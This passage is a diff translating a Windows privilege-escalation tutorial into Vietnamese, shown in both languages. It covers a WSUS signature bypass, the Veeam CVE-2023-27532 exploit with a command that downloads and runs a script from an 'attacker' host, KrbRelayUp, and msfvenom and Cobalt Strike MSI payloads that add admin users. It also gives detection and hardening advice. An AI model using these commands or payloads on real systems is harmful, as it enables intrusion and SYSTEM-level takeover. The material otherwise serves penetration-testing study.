+WSUS thường từ chối nội dung thực thi tùy ý chưa được ký. Tuy nhiên, trong `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, đường dẫn .NET `VerifyFile` đặt cờ kiểm tra chứng chỉ thành false khi tên tệp được cung cấp kết thúc bằng `.txt` hoặc `.esd`; khi đó `CheckCertificateSignature` bị bỏ qua mà không xác minh trước rằng các byte đó là văn bản hoặc ảnh ESD hợp lệ. Do đó, một PE không thay đổi, chẳng hạn được đặt tên là `payload.exe.txt`, có thể vượt qua bước xác minh nội dung rồi được trình xử lý cài đặt dòng lệnh của bản cập nhật khởi chạy. Đây là lỗi nhầm lẫn chính sách/kiểu dữ liệu, không phải giả mạo chữ ký.<sup>[[39]](#references)</sup>
 
 ```csharp
 bool checkSignature = true;
@@ -331,11 +331,11 @@ if (checkSignature)
     CheckCertificateSignature(/* downloaded file */);
 ```
 
-#### BITS-compatible staging and automation
+#### Staging và tự động hóa tương thích với BITS
 
-Calling `spDeployUpdate` makes WSUS fetch the registered content. The origin must satisfy BITS' HTTP expectations: a reachable URL alone is insufficient because the transfer uses an initial `HEAD`/`GET` flow and byte-range requests. A server without Range support produces WSUS synchronization `EventId=364` stating that BITS requires the Range protocol header.<sup>[[39]](#references)</sup>
+Gọi `spDeployUpdate` sẽ khiến WSUS tải nội dung đã đăng ký. Máy chủ nguồn phải đáp ứng các yêu cầu HTTP của BITS: chỉ có URL truy cập được là chưa đủ vì quá trình truyền sử dụng luồng `HEAD`/`GET` ban đầu cùng các yêu cầu byte-range. Máy chủ không hỗ trợ Range sẽ tạo ra sự kiện đồng bộ WSUS `EventId=364`, cho biết BITS yêu cầu header giao thức Range.<sup>[[39]](#references)</sup>
 
-The research PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generates the SQL required for the import/fragment/URL/group/deployment chain, includes a modified MSSQL client for executing it, and ships `BitsWebServer.py` for content staging. A minimal authorized-lab invocation is:<sup>[[40]](#references)</sup>
+PoC nghiên cứu [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) tạo SQL cần thiết cho chuỗi import/fragment/URL/group/deployment, đi kèm một MSSQL client đã chỉnh sửa để thực thi SQL đó, đồng thời cung cấp `BitsWebServer.py` để staging nội dung. Cách gọi tối thiểu trong lab được cấp phép là:<sup>[[40]](#references)</sup>
 
 ```bash
 python3 NotWSUSpicious.py \
@@ -349,67 +349,67 @@ python3 NotWSUSpicious.py \
 python3 BitsWebServer.py
 ```
 
-#### Unattended execution and retry persistence
+#### Thực thi không cần giám sát và persistence qua cơ chế thử lại
 
-Client-side interaction depends on policy. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, option `4 - Auto download and schedule install`, makes an approved update download and install on the configured schedule without the user manually selecting it. In testing, a payload whose update remained failed/incomplete was immediately offered again after the callback process exited, so retry behavior can become recurring execution persistence; it is noisy because the client exposes an update-failed state.<sup>[[39]](#references)</sup>
+Tương tác phía client phụ thuộc vào policy. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, tùy chọn `4 - Auto download and schedule install`, sẽ tải xuống và cài đặt một update đã được phê duyệt theo lịch đã cấu hình mà không cần người dùng chọn thủ công. Trong quá trình kiểm thử, payload có trạng thái update vẫn failed/incomplete được đề xuất lại ngay sau khi process callback thoát, vì vậy hành vi retry có thể trở thành persistence thông qua thực thi lặp lại; cách này dễ gây chú ý vì client hiển thị trạng thái update-failed.<sup>[[39]](#references)</sup>
 
-#### Detection and hardening pivots
+#### Các hướng pivot để phát hiện và hardening
 
-Useful server- and client-side pivots from this chain are:<sup>[[39]](#references)</sup>
+Các hướng pivot hữu ích phía server và client trong chuỗi này là:<sup>[[39]](#references)</sup>
 
-- Audit `SUSDB` execution of `spCreateTargetGroup`, `spSetBatchURL` and `spDeployUpdate`; investigate new targeting groups, external content origins, `.txt`/`.esd` update payloads and deployments performed by unexpected principals (especially non-computer accounts).
-- Review `C:\Program Files\Update Services\LogFiles` for `ContentSyncAgent`, `FileVerified`, the misspelled `FileVerficationFailed`, and `EventId=364`; correlate verification with payload extension and content magic rather than trusting the suffix.
-- Hunt for Windows Update installation repeatedly failing/retrying and for PE execution or unexpected child/network activity from content carrying `.txt` or `.esd` names.
-- Require Extended Protection for Authentication on the database service where supported, and restrict database network access to the WSUS server and authorized administrative systems. Minimize and audit `EXECUTE` rights on the custom-update procedures.
+- Audit việc thực thi `spCreateTargetGroup`, `spSetBatchURL` và `spDeployUpdate` trên `SUSDB`; điều tra các targeting group mới, nguồn nội dung bên ngoài, payload update `.txt`/`.esd` và các deployment do principal bất ngờ thực hiện (đặc biệt là tài khoản không phải máy tính).
+- Kiểm tra `C:\Program Files\Update Services\LogFiles` để tìm `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` (viết sai chính tả) và `EventId=364`; đối chiếu quá trình xác minh với phần mở rộng payload và magic của nội dung thay vì tin vào hậu tố.
+- Tìm các trường hợp cài đặt Windows Update liên tục thất bại/thử lại, cũng như việc thực thi PE hoặc hoạt động mạng/process con bất ngờ từ nội dung mang tên `.txt` hoặc `.esd`.
+- Bắt buộc sử dụng Extended Protection for Authentication trên dịch vụ database nếu được hỗ trợ, đồng thời giới hạn quyền truy cập mạng database cho máy chủ WSUS và các hệ thống quản trị được ủy quyền. Hạn chế tối đa và audit quyền `EXECUTE` trên các stored procedure custom-update.
 
 ## Third-Party Auto-Updaters and Agent IPC (local privesc)
 
-Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:
+Nhiều agent doanh nghiệp cung cấp một bề mặt IPC trên localhost và một kênh update có đặc quyền. Nếu có thể ép quá trình enrollment kết nối tới server của attacker và updater tin cậy một root CA giả mạo hoặc kiểm tra signer yếu, người dùng cục bộ có thể chuyển một MSI độc hại để dịch vụ SYSTEM cài đặt. Xem kỹ thuật tổng quát hóa (dựa trên chuỗi Netskope stAgentSvc – CVE-2025-0309) tại đây:
 
 
 {{#ref}}
 abusing-auto-updaters-and-ipc.md
 {{#endref}}
 
-## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)
+## Veeam Backup & Replication CVE-2023-27532 (SYSTEM qua TCP 9401)
 
-The original version-specific description and reconnaissance note were:
+Mô tả ban đầu theo phiên bản cụ thể và ghi chú trinh sát là:
 
-Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>
+Veeam B&R < `11.0.1.1261` để lộ một service localhost trên **TCP/9401**, xử lý các message do attacker kiểm soát, cho phép thực thi lệnh tùy ý dưới quyền **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>
 
-- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
+- **Recon**: xác nhận listener và phiên bản, ví dụ: `netstat -ano | findstr 9401` và `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
 
-Veeam Backup & Replication and Cloud Connect use a core backup service on **TCP/9401 by default**. [Veeam's advisory](https://www.veeam.com/kb4424) describes unauthenticated disclosure of encrypted configuration-database credentials within the backup network perimeter; a separate public PoC demonstrates a command-execution path as **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> The service may bind beyond localhost, so check its actual address and PID.
+Veeam Backup & Replication và Cloud Connect sử dụng một core backup service trên **TCP/9401 theo mặc định**. [Thông báo bảo mật của Veeam](https://www.veeam.com/kb4424) mô tả việc tiết lộ trái phép thông tin xác thực database cấu hình đã mã hóa trong phạm vi mạng backup; một PoC công khai riêng biệt cho thấy một đường dẫn thực thi lệnh dưới quyền **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Service có thể bind vào địa chỉ không chỉ giới hạn ở localhost, vì vậy hãy kiểm tra địa chỉ và PID thực tế.
 
-- **Recon**: confirm that TCP/9401 belongs to `Veeam.Backup.Service.exe`, then inspect the installed product and patch metadata. `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` are clues, not a complete patch check.
-- **Fixed floors**: Veeam lists **11a build 11.0.1.1261 P20230227** and **12 build 12.0.0.1420 P20230223** as the first fixed releases; earlier releases are affected. A four-part file version alone cannot distinguish an unpatched base build from a later patch on those same build numbers. Verify the patch identifier against the [vendor build history](https://www.veeam.com/kb2680) before calling a boundary build fixed.
-- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
+- **Recon**: xác nhận TCP/9401 thuộc về `Veeam.Backup.Service.exe`, sau đó kiểm tra sản phẩm đã cài đặt và metadata bản vá. `netstat -ano | findstr 9401` và `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` là manh mối, không phải bước kiểm tra bản vá đầy đủ.
+- **Các mốc phiên bản đã sửa lỗi**: Veeam liệt kê **11a build 11.0.1.1261 P20230227** và **12 build 12.0.0.1420 P20230223** là các bản phát hành đầu tiên đã sửa lỗi; các bản phát hành trước đó bị ảnh hưởng. Chỉ dựa vào file version gồm bốn phần thì không thể phân biệt một base build chưa được vá với một bản vá mới hơn trên cùng build number. Hãy xác minh patch identifier theo [lịch sử build của nhà cung cấp](https://www.veeam.com/kb2680) trước khi xác định một boundary build đã được sửa lỗi.
+- **Exploit**: đặt một PoC như `VeeamHax.exe` cùng các Veeam DLL cần thiết trong cùng thư mục, sau đó kích hoạt payload SYSTEM qua local socket:
 
 ```powershell
 .\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
 ```
 
-The service executes the command as SYSTEM.
+Dịch vụ thực thi lệnh với quyền SYSTEM.
 
-The cited PoC demonstrates command execution as SYSTEM when its additional prerequisites hold; the vendor's advisory describes the credential-disclosure issue.
+PoC được trích dẫn minh họa việc thực thi lệnh với quyền SYSTEM khi đáp ứng các điều kiện tiên quyết bổ sung; thông báo tư vấn của nhà cung cấp mô tả vấn đề làm lộ thông tin xác thực.
 
 ## KrbRelayUp
 
-The original default-environment description was:
+Mô tả ban đầu về môi trường mặc định là:
 
-A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.
+Lỗ hổng **leo thang đặc quyền cục bộ** tồn tại trong các môi trường **domain** Windows trong những điều kiện cụ thể. Các điều kiện này bao gồm môi trường không **bắt buộc ký LDAP**, người dùng có quyền tự thiết lập **Resource-Based Constrained Delegation (RBCD)** và người dùng có khả năng tạo máy tính trong domain. Lưu ý rằng các **yêu cầu** này được đáp ứng bằng **cài đặt mặc định**.
 
-A local Kerberos relay can cross from a lower-privileged logon to a privileged directory write when a suitable COM server authenticates and the relayed principal has rights on the target object. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) both RBCD and `msDS-KeyCredentialLink` (shadow-credential) LDAP writes; KrbRelayUp automates some of these paths. An RBCD chain requires applicable delegation and target-object rights, while a shadow-credential chain requires key-credential write rights and a KDC that supports the certificate authentication path. Neither path follows from domain membership alone.
+Một cuộc relay Kerberos cục bộ có thể chuyển từ phiên đăng nhập với đặc quyền thấp sang thao tác ghi thư mục có đặc quyền cao khi một COM server phù hợp xác thực và principal bị relay có quyền trên đối tượng mục tiêu. [Tài liệu KrbRelay](https://github.com/cube0x0/KrbRelay) mô tả cả thao tác ghi LDAP RBCD và `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp tự động hóa một số đường tấn công này. Chuỗi tấn công RBCD yêu cầu có quyền delegation và quyền trên đối tượng mục tiêu phù hợp, còn chuỗi shadow-credential yêu cầu quyền ghi key-credential và KDC hỗ trợ đường xác thực bằng chứng chỉ. Không đường tấn công nào trong số này tự động khả thi chỉ vì người dùng là thành viên domain.
 
-Check the actual DC's [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) and [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) policy, the relayed identity's object ACL, and the selected COM class's authentication and impersonation levels. The caller's logon type and credential context matter: a WinRM session can behave differently from an interactive or new-credentials logon. Firewall/OXID routing and installed updates can change the result too. Treat a permissive policy or matching ACL as a review candidate; passive enumeration should not trigger COM coercion, relay authentication, or directory writes. A machine-account shadow credential may lead to a machine ticket and, only if that account has the required directory replication rights, a separate DCSync path.
+Kiểm tra chính sách [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) và [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) thực tế của DC, ACL đối tượng của danh tính bị relay, cũng như các mức xác thực và mạo danh của lớp COM được chọn. Loại đăng nhập và ngữ cảnh thông tin xác thực của người gọi cũng quan trọng: phiên WinRM có thể hoạt động khác với phiên đăng nhập tương tác hoặc đăng nhập bằng thông tin xác thực mới. Định tuyến firewall/OXID và các bản cập nhật đã cài đặt cũng có thể làm thay đổi kết quả. Hãy xem chính sách cho phép hoặc ACL phù hợp là đối tượng cần rà soát; việc liệt kê thụ động không nên kích hoạt COM coercion, xác thực relay hoặc thao tác ghi thư mục. Shadow credential của tài khoản máy có thể dẫn đến machine ticket và chỉ khi tài khoản đó có các quyền replication thư mục cần thiết thì mới có thể dẫn đến một đường DCSync riêng.
 
-Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)
+Tìm **exploit tại** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)
 
-For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>
+Để biết thêm thông tin về luồng tấn công, hãy xem [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>
 
 ## AlwaysInstallElevated
 
-**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
+**Nếu** 2 khóa registry này được **bật** (giá trị là **0x1**), thì người dùng ở bất kỳ cấp đặc quyền nào cũng có thể **cài đặt** (thực thi) các tệp `*.msi` với quyền NT AUTHORITY\\**SYSTEM**.
 
 ```bash
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -423,21 +423,21 @@ msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o a
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
 ```
 
-If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**
+Nếu bạn có một phiên meterpreter, bạn có thể tự động hóa kỹ thuật này bằng module **`exploit/windows/local/always_install_elevated`**
 
 ### PowerUP
 
-Use the `Write-UserAddMSI` command from power-up to create inside the current directory a Windows MSI binary to escalate privileges. This script writes out a precompiled MSI installer that prompts for a user/group addition (so you will need GIU access):
+Dùng lệnh `Write-UserAddMSI` từ power-up để tạo một tệp nhị phân Windows MSI trong thư mục hiện tại nhằm leo thang đặc quyền. Script này ghi ra một trình cài đặt MSI đã biên dịch sẵn, trình cài đặt sẽ yêu cầu thêm người dùng/nhóm (vì vậy bạn cần quyền truy cập GUI):
 
 ```
 Write-UserAddMSI
 ```
 
-Just execute the created binary to escalate privileges.
+Chỉ cần chạy binary vừa tạo để leo thang đặc quyền.
 
 ### MSI Wrapper
 
-Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**
+Đọc tutorial này để tìm hiểu cách tạo MSI wrapper bằng công cụ này. Lưu ý rằng bạn có thể bọc một tệp "**.bat**" nếu bạn **chỉ** muốn **thực thi** **các dòng lệnh**
 
 
 {{#ref}}
@@ -453,34 +453,34 @@ create-msi-with-wix.md
 
 ### Create MSI with Visual Studio
 
-- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
-- Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
-- Give the project a name, like **AlwaysPrivesc**, use **`C:\privesc`** for the location, select **place solution and project in the same directory**, and click **Create**.
-- Keep clicking **Next** until you get to step 3 of 4 (choose files to include). Click **Add** and select the Beacon payload you just generated. Then click **Finish**.
-- Highlight the **AlwaysPrivesc** project in the **Solution Explorer** and in the **Properties**, change **TargetPlatform** from **x86** to **x64**.
-  - There are other properties you can change, such as the **Author** and **Manufacturer** which can make the installed app look more legitimate.
-- Right-click the project and select **View > Custom Actions**.
-- Right-click **Install** and select **Add Custom Action**.
-- Double-click on **Application Folder**, select your **beacon.exe** file and click **OK**. This will ensure that the beacon payload is executed as soon as the installer is run.
-- Under the **Custom Action Properties**, change **Run64Bit** to **True**.
-- Finally, **build it**.
-  - If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.
+- **Tạo** bằng Cobalt Strike hoặc Metasploit một **payload Windows EXE TCP mới** tại `C:\privesc\beacon.exe`
+- Mở **Visual Studio**, chọn **Create a new project** và nhập "installer" vào hộp tìm kiếm. Chọn dự án **Setup Wizard** rồi nhấp **Next**.
+- Đặt tên cho dự án, chẳng hạn **AlwaysPrivesc**, dùng `C:\privesc` làm vị trí, chọn **place solution and project in the same directory**, rồi nhấp **Create**.
+- Tiếp tục nhấp **Next** cho đến bước 3/4 (chọn các tệp cần đưa vào). Nhấp **Add** và chọn payload Beacon vừa tạo. Sau đó nhấp **Finish**.
+- Chọn dự án **AlwaysPrivesc** trong **Solution Explorer**, rồi trong **Properties**, đổi **TargetPlatform** từ **x86** sang **x64**.
+  - Bạn có thể thay đổi các thuộc tính khác, chẳng hạn **Author** và **Manufacturer**, để ứng dụng sau khi cài đặt trông hợp pháp hơn.
+- Nhấp chuột phải vào dự án và chọn **View > Custom Actions**.
+- Nhấp chuột phải vào **Install** và chọn **Add Custom Action**.
+- Nhấp đúp vào **Application Folder**, chọn tệp **beacon.exe** rồi nhấp **OK**. Việc này đảm bảo payload Beacon được thực thi ngay khi trình cài đặt chạy.
+- Trong **Custom Action Properties**, đổi **Run64Bit** thành **True**.
+- Cuối cùng, **build dự án**.
+  - Nếu xuất hiện cảnh báo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, hãy đảm bảo bạn đã đặt platform thành x64.
 
 ### MSI Installation
 
-To execute the **installation** of the malicious `.msi` file in **background:**
+Để thực thi quá trình **cài đặt** tệp `.msi` độc hại trong **nền:**
 
 ```
 msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
 ```
 
-To exploit this vulnerability you can use: _exploit/windows/local/always_install_elevated_
+Để khai thác lỗ hổng này, bạn có thể dùng: _exploit/windows/local/always_install_elevated_
 
-## Antivirus and Detectors
+## Antivirus và công cụ phát hiện
 
-### Audit Settings
+### Cài đặt kiểm tra
 
-These settings decide what is being **logged**, so you should pay attention
+Các cài đặt này quyết định những gì được **ghi nhật ký**, vì vậy bạn nên chú ý.
 
 ```
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
@@ -488,7 +488,7 @@ reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
 
 ### WEF
 
-Windows Event Forwarding, is interesting to know where are the logs sent
+Windows Event Forwarding, sẽ rất hữu ích nếu biết nhật ký được gửi đến đâu.
 
 ```bash
 reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
@@ -496,7 +496,7 @@ reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\Subs
 
 ### LAPS
 
-**LAPS** is designed for the **management of local Administrator passwords**, ensuring that each password is **unique, randomised, and regularly updated** on computers joined to a domain. These passwords are securely stored within Active Directory and can only be accessed by users who have been granted sufficient permissions through ACLs, allowing them to view local admin passwords if authorized.
+**LAPS** được thiết kế để **quản lý mật khẩu Administrator cục bộ**, đảm bảo mỗi mật khẩu **duy nhất, được tạo ngẫu nhiên và cập nhật thường xuyên** trên các máy tính đã tham gia domain. Những mật khẩu này được lưu trữ an toàn trong Active Directory và chỉ người dùng được cấp đủ quyền thông qua ACL mới có thể truy cập, cho phép họ xem mật khẩu admin cục bộ nếu được ủy quyền.
 
 
 {{#ref}}
@@ -505,17 +505,17 @@ reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\Subs
 
 ### WDigest
 
-If active, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
-[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
+Nếu được kích hoạt, **mật khẩu dạng plain-text sẽ được lưu trong LSASS** (Local Security Authority Subsystem Service).\
+[**Tìm hiểu thêm về WDigest tại đây**](../stealing-credentials/credentials-protections.md#wdigest).
 
 ```bash
 reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
 ```
 
-### LSA Protection
+### Bảo vệ LSA
 
-Starting with **Windows 8.1**, Microsoft introduced enhanced protection for the Local Security Authority (LSA) to **block** attempts by untrusted processes to **read its memory** or inject code, further securing the system.\
-[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
+Bắt đầu từ **Windows 8.1**, Microsoft đã tăng cường bảo vệ Local Security Authority (LSA) để **chặn** các tiến trình không đáng tin cậy cố **đọc bộ nhớ** của LSA hoặc tiêm mã, qua đó tăng cường bảo mật hệ thống.\
+[**Tìm hiểu thêm về LSA Protection tại đây**](../stealing-credentials/credentials-protections.md#lsa-protection).
 
 ```bash
 reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
@@ -523,26 +523,26 @@ reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
 
 ### Credentials Guard
 
-**Credential Guard** was introduced in **Windows 10**. Its purpose is to safeguard credentials stored on a device against threats such as pass-the-hash attacks. [**More information about Credential Guard is available here.**](../stealing-credentials/credentials-protections.md#credential-guard)
+**Credential Guard** được giới thiệu trong **Windows 10**. Mục đích của tính năng này là bảo vệ thông tin xác thực được lưu trữ trên thiết bị khỏi các mối đe dọa như các cuộc tấn công pass-the-hash. [**Tìm hiểu thêm về Credential Guard tại đây.**](../stealing-credentials/credentials-protections.md#credential-guard)
 
 ```bash
 reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
 ```
 
-### Cached Credentials
+### Thông tin xác thực được lưu trong bộ nhớ đệm
 
-**Domain credentials** are authenticated by the **Local Security Authority** (LSA) and utilized by operating system components. When a user's logon data is authenticated by a registered security package, domain credentials for the user are typically established.\
-[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
+**Thông tin xác thực miền** được xác thực bởi **Local Security Authority** (LSA) và được các thành phần của hệ điều hành sử dụng. Thông tin xác thực miền của người dùng thường được thiết lập khi dữ liệu đăng nhập của họ được một gói bảo mật đã đăng ký xác thực.\
+[**Tìm hiểu thêm về thông tin xác thực được lưu trong bộ nhớ đệm tại đây**](../stealing-credentials/credentials-protections.md#cached-credentials).
 
 ```bash
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
 ```
 
-## Users & Groups
+## Người dùng & Nhóm
 
-### Enumerate Users & Groups
+### Liệt kê Người dùng & Nhóm
 
-You should check if any of the groups where you belong have interesting permissions
+Bạn nên kiểm tra xem nhóm nào bạn thuộc về có quyền đáng chú ý hay không.
 
 ```bash
 # CMD
@@ -559,57 +559,57 @@ Get-ChildItem C:\Users -Force | select Name
 Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 ```
 
-### Privileged groups
+### Nhóm đặc quyền
 
-If you **belongs to some privileged group you may be able to escalate privileges**. Learn about privileged groups and how to abuse them to escalate privileges here:
+Nếu bạn **thuộc một nhóm đặc quyền, bạn có thể leo thang đặc quyền**. Tìm hiểu về các nhóm đặc quyền và cách lạm dụng chúng để leo thang đặc quyền tại đây:
 
 
 {{#ref}}
 ../active-directory-methodology/privileged-groups-and-token-privileges.md
 {{#endref}}
 
-### Token manipulation
+### Thao tác token
 
-**Learn more** about what is a **token** in this page: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
-Check the following page to **learn about interesting tokens** and how to abuse them:
+**Tìm hiểu thêm** về **token** là gì trên trang này: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
+Xem trang sau để **tìm hiểu về các token đáng chú ý** và cách lạm dụng chúng:
 
 
 {{#ref}}
 privilege-escalation-abusing-tokens.md
 {{#endref}}
 
-### Logged users / Sessions
+### Người dùng đã đăng nhập / Phiên
 
 ```bash
 qwinsta
 klist sessions
 ```
 
-### Home folders
+### Thư mục người dùng
 
 ```bash
 dir C:\Users
 Get-ChildItem C:\Users
 ```
 
-### Password Policy
+### Chính sách mật khẩu
 
 ```bash
 net accounts
 ```
 
-### Get the content of the clipboard
+### Lấy nội dung từ clipboard
 
 ```bash
 powershell -command "Get-Clipboard"
 ```
 
-## Running Processes
+## Tiến trình đang chạy
 
-### File and Folder Permissions
+### Quyền đối với tệp và thư mục
 
-First of all, listing the processes **check for passwords inside the command line of the process**.\
-Check if you can **overwrite some binary running** or if you have write permissions of the binary folder to exploit possible [**DLL Hijacking attacks**](dll-hijacking/index.html):
+Trước tiên, khi liệt kê các tiến trình, **hãy kiểm tra mật khẩu trong dòng lệnh của tiến trình**.\
+Kiểm tra xem bạn có thể **ghi đè một binary đang chạy** hay có quyền ghi vào thư mục chứa binary để khai thác các [**tấn công DLL Hijacking**](dll-hijacking/index.html) tiềm ẩn hay không:
 
 ```bash
 Tasklist /SVC #List processes running and services
@@ -622,11 +622,11 @@ Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "sv
 Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
 ```
 
-Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).
+Luôn kiểm tra xem có [**electron/cef/chromium debuggers** đang chạy hay không; bạn có thể lợi dụng chúng để leo thang đặc quyền](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).
 
-A debugger listener can be short-lived, so its absence from one passive port snapshot does not prove it was never exposed. Correlate any observed listener with its PID, process owner, and the lower-privileged user's ability to reach it; an application name or debug flag alone does not establish cross-user code execution. Keep routine enumeration passive rather than sending debugger commands.
+Debugger listener có thể chỉ tồn tại trong thời gian ngắn, vì vậy việc không thấy nó trong một lần chụp nhanh các cổng thụ động không chứng minh rằng nó chưa từng được mở. Đối chiếu mọi listener quan sát được với PID, chủ sở hữu tiến trình và khả năng truy cập của người dùng có đặc quyền thấp hơn; chỉ tên ứng dụng hoặc cờ debug thì chưa đủ để xác định khả năng thực thi mã giữa các người dùng. Hãy chỉ thực hiện enumeration thụ động thường lệ, không gửi lệnh debugger.
 
-**Checking permissions of the processes binaries**
+**Kiểm tra quyền của các binary tiến trình**
 
 ```bash
 for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
@@ -637,7 +637,7 @@ for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executabl
 )
 ```
 
-**Checking permissions of the folders of the processes binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
+**Kiểm tra quyền của các thư mục chứa tệp nhị phân của tiến trình (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
 
 ```bash
 for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
@@ -647,13 +647,13 @@ todos %username%" && echo.
 )
 ```
 
-### Snort dynamic preprocessor directories
+### Thư mục dynamic preprocessor của Snort
 
-Snort 2 can load shared libraries from a `dynamicpreprocessor directory` declared in the configuration selected with `snort.exe -c <config>`. For a scheduled task or service that runs Snort under a different account, inspect that exact configuration and the declared module directory ACL. If your token can create files there, the path is a review candidate for code execution when that task or service next loads modules. Verify the run-as account's effective privileges, the active configuration, module compatibility, and any deny or share restrictions; a writable directory alone does not establish escalation. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) describes runtime module loading.
